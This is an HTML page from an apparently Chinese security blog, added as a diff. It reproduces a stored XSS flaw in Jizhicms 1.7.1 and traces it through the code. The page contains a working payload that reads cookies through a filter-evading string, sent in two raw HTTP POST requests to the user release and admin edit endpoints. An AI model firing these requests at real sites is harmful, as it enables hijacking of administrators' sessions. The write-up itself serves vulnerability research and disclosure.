@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Jizhicms 1.7.1 存储XSS漏洞一、漏洞简介二、漏洞影响Jizhicms 1.7.1 三、复现过程首先自己注册一个账户然后登陆，在文章标题处插入XSS payload payload:&lt;details open&gt;   管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞首先看一下在前台发表文章处的请求数据包 POST &#x2F;user&#x2F;release.htm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Jizhicms 1.7.1 存储XSS漏洞一、漏洞简介二、漏洞影响Jizhicms 1.7.1 三、复现过程首先自己注册一个账户然后登陆，在文章标题处插入XSS payload payload:&lt;details open&gt;   管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞首先看一下在前台发表文章处的请求数据包 POST &#x2F;user&#x2F;release.htm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId24.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="article:published_time" content="2022-07-08T06:25:58.059Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.673Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId24.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Jizhicms/Jizhicms 1.7.1 存储XSS漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.059Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Jizhicms-1-7-1-存储XSS漏洞"><a href="#Jizhicms-1-7-1-存储XSS漏洞" class="headerlink" title="Jizhicms 1.7.1 存储XSS漏洞"></a>Jizhicms 1.7.1 存储XSS漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jizhicms 1.7.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先自己注册一个账户然后登陆，在文章标题处插入XSS payload</p>
+<pre><code>payload:&lt;details open&gt;
+</code></pre>
+<p><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
+<p>管理员登录后台点击编辑且没有修改里面的字符串就保存的话那便会触发XSS漏洞<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="2.png"><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="3.png">首先看一下在前台发表文章处的请求数据包</p>
+<pre><code>POST /user/release.html HTTP/1.1
+Host: www.0-sec.org:8091
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 187
+Origin: http://www.0-sec.org:8091
+Connection: close
+Referer: http://www.0-sec.org:8091/user/release.html
+Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b
+
+ajax=1&amp;isshow=&amp;molds=article&amp;tid=2&amp;title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&amp;keywords=&amp;litpic=&amp;description=123&amp;body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E
+</code></pre>
+<p>根据url定位到release函数<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="4.png">该函数主要是先检查是否是登录状态然后检查是否存在违禁词汇，其中违禁词汇取的是webconf[&#39;mingan&#39;]的值，由前篇文章可知数据存放在数据库中然后通过缓存读取相关信息，可以直接输出一下<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="5.png"></p>
+<pre><code>过滤的东西和XSS关系不大，主要是涉及到文章敏感汉字之类的，然后被保存到数据库中的时候&lt;&gt;变成了&amp;lt; &amp;gt;
+</code></pre>
+<p><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId29.png" alt="6.png">看下是如何进行操作的，继续跟进该函数，通过frparam函数进行操作之后对title进行赋值<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="7.png">frparam函数在获取到相关值后调用format_param函数对数据进行处理，由于传入的int的值为1.所以对传入的参数进行了html实体编码<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId31.png" alt="8.png"><img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="9.png">所以在数据库中存储的是进行过实体编码的xss payload最后登入后台看下编辑函数</p>
+<pre><code>POST /admin.php/Article/editarticle.html HTTP/1.1
+Host: www.0-sec.org:8091
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 340
+Origin: http://www.0-sec.org:8091
+Connection: close
+Referer: http://www.0-sec.org:8091/admin.php/Article/editarticle/id/34.html
+Cookie: PHPSESSID=t616fln4me32an09rj6v67vr5b
+
+go=1&amp;id=34&amp;title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&amp;tid=2&amp;seo_title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&amp;hits=0&amp;keywords=&amp;litpic=&amp;file=&amp;description=123&amp;orders=0&amp;tags=&amp;isshow=0&amp;addtime=2020-05-28+17%3A17%3A39&amp;target=&amp;ownurl=&amp;body=%3Cp%3E123%3Cbr%2F%3E%3C%2Fp%3E
+</code></pre>
+<p>看一下数据中的更新情况，又将&lt; &gt;变成了&lt;&gt;,所以触发了XSS漏洞<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="10.png">定位到漏洞函数editarticle，看到同样调用了frparam函数<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="11.png">frparam函数由于没有传入参数会直接返回url中的数据<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId35.png" alt="12.png">在请求包中可以看到是已经将html实体化编码变成了原字符，所以data取到的数据时没有经过html编码的数据<img src="/resource/Jizhicms1.7.1%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/media/rId36.png" alt="13.png">所以在进行update更新操作的时候就会向数据库写入未经html实体化编码的数据</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7861">https://xz.aliyun.com/t/7861</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrk2009oy8v14e7dfxqu" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000129%EF%BC%89Jolokia%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Jizhicms/Jizhicms%201.7.1%20%E5%90%8E%E5%8F%B0%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
